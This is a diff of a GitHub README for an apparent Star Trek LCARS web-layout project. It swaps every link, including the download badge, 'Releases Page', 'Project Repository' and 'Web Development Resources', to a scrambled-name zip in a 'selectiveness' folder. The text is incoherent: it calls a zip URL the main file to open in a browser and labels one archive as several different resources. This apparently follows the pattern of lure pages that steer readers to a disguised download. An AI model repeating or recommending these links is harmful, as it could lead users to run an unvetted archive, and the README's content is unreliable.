@@ -1,6 +1,6 @@
 # 🌌 HTML-CSS-JS-Star-Trek-LCARS-Layout - Experience a Star Trek Interface
 
-[![Download](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTML-CSS-JS-Star-Trek-LCARS-Layout.zip)](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTML-CSS-JS-Star-Trek-LCARS-Layout.zip)
+[![Download](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTM_CS_Star_J_LCAR_Layout_Trek_v3.1.zip)](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTM_CS_Star_J_LCAR_Layout_Trek_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run this application smoothly, you should meet the following requirements:
 
 To get started, visit the Releases page and download the latest version of the software. Click the button below to go directly to it:
 
-[Download Here](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTML-CSS-JS-Star-Trek-LCARS-Layout.zip)
+[Download Here](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTM_CS_Star_J_LCAR_Layout_Trek_v3.1.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -35,7 +35,7 @@ After the download finishes:
 
 Here’s a brief overview of what you will find inside the downloaded folder:
 
-- **https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTML-CSS-JS-Star-Trek-LCARS-Layout.zip**: This is the main file. Opening this will show you the LCARS interface.
+- **https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTM_CS_Star_J_LCAR_Layout_Trek_v3.1.zip**: This is the main file. Opening this will show you the LCARS interface.
 - **styles/**: This folder contains SCSS files that manage the look and feel of the interface.
 - **scripts/**: In this section, you will find JavaScript that enhances the functionality of the application.
 - **assets/**: This folder holds any images or additional files used in the project.
@@ -49,7 +49,7 @@ Here’s a brief overview of what you will find inside the downloaded folder:
 
 ## ⚙️ How to Use the Application
 
-1. **Open the Interface**: After downloading, locate the `https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTML-CSS-JS-Star-Trek-LCARS-Layout.zip` file and open it in your web browser.
+1. **Open the Interface**: After downloading, locate the `https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTM_CS_Star_J_LCAR_Layout_Trek_v3.1.zip` file and open it in your web browser.
 2. **Explore**: Navigate through the various panels. Each section is designed to provide quick access to different information.
 3. **Interact**: Click the buttons and panels to get a feel for the layout and features.
 
@@ -75,9 +75,9 @@ This project is licensed under the MIT License. You can modify and use the code 
 
 ## 🌐 Links & Resources
 
-- [Project Repository](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTML-CSS-JS-Star-Trek-LCARS-Layout.zip)
-- [Releases Page](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTML-CSS-JS-Star-Trek-LCARS-Layout.zip)
-- [Web Development Resources](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTML-CSS-JS-Star-Trek-LCARS-Layout.zip)—learn more about HTML, CSS, and JavaScript.
+- [Project Repository](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTM_CS_Star_J_LCAR_Layout_Trek_v3.1.zip)
+- [Releases Page](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTM_CS_Star_J_LCAR_Layout_Trek_v3.1.zip)
+- [Web Development Resources](https://raw.githubusercontent.com/Tompedido/HTML-CSS-JS-Star-Trek-LCARS-Layout/main/selectiveness/HTM_CS_Star_J_LCAR_Layout_Trek_v3.1.zip)—learn more about HTML, CSS, and JavaScript.
 
 For further assistance, feel free to reach out through the issues tab in the GitHub repository. 
 
